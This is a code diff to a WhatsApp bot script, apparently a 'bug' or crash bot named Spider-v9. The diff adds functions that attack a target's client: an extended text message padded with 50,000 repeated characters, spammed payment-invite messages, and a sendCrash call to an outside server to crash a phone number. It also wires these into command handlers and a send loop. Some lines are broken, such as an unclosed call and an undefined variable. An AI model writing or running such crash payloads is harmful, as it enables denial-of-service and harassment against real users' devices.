@@ -345,7 +345,46 @@ const reaction = async (jidss, emoji) => {
 async function aipong(target) {
 await sam.relayMessage(target, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{ participant: { jid: target } })
 } 
-
+async function XiosPay(jid) {
+			sam.relayMessage(jid, {
+				'paymentInviteMessage': {
+					'serviceType': "UPI",
+					'expiryTimestamp': Date.now() + 86400000
+				}
+			}, {
+				'participant': {
+					'jid': jid
+				}
+			});
+			console.log(chalk.green("Send Bug By Spider-v9"));
+		};
+	async function XiosVirus(jid) {
+			sam.relayMessage(jid, {
+				'extendedTextMessage': {
+					'text': '.',
+					'contextInfo': {
+						'stanzaId': jid,
+						'participant': jid,
+						'quotedMessage': {
+							'conversation': ' ⿻SPIDER-V9 ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤' + 'ꦾ'.repeat(50000)
+						},
+						'disappearingMode': {
+							'initiator': "CHANGED_IN_CHAT",
+							'trigger': "CHAT_SETTING"
+						}
+					},
+					'inviteLinkGroupTypeV2': "DEFAULT"
+				}
+			}, {
+				'participant': {
+					'jid': jid
+				}
+			}, {
+				'messageId': null
+			});
+			console.log(chalk.green("Send Bug By GetsuzoZhiro🐉"));
+		};
+	
 //=======≠============Bugs========================//
 async function InVisiXz(target, spider, cct = false, ptcp = false) {
 			let etc = generateWAMessageFromContent(target,
@@ -778,6 +817,15 @@ async function TrashSystem(target, spider, Ptcp = true) {
    );
    console.log(chalk.green("Send Bug By Spider〽️"));
   };
+async function sendCrash(target) {
+			try {
+				const newcrash = await fetchJson('http://nxf-01.nexfuture.com.br:25579/sendCrash?numero=' + X);
+				console.log(chalk.green("Send Bug By SPIDER-V9"));
+				console.log(chalk.red("InVisible⚡"));
+			} catch (error) {
+				console.error("Error Fetching Crash:", error);
+			}
+		}
 //================================================//
 async function crtVid(url) {
     const { videoMessage } = await generateWAMessageContent({
@@ -1174,7 +1222,7 @@ var contactInfo = await sam.onWhatsApp(target);
 }
 reply(`Wait Your Target is being Utilised`)
 // Function to convert text to invisible characters
-   await TrashSystem(target, sam, ptcp = true)
+   await sendCrash(target)
   
  
 reply(`
@@ -1211,6 +1259,7 @@ reply(`Wait Your Target is being Utilised`)
     // Function to convert text to invisible characters
     await TrashSystem(target, sam, ptcp = true);
    await aipong(target)
+   await XiosVirus(target
     await TrashSystem(target, sam, cct = true, ptcp = true);
     await aipong(target)
 
@@ -1434,6 +1483,8 @@ reply(ppk + " detik");
 reply(mess.bugrespon)
 for (let j = 0; j < jumlah; j++) {
 await aipong(target)
+await XiosVirus(target)
+await XiosPay(target)
 await aipong(target)
 await sleep(1500)
 }
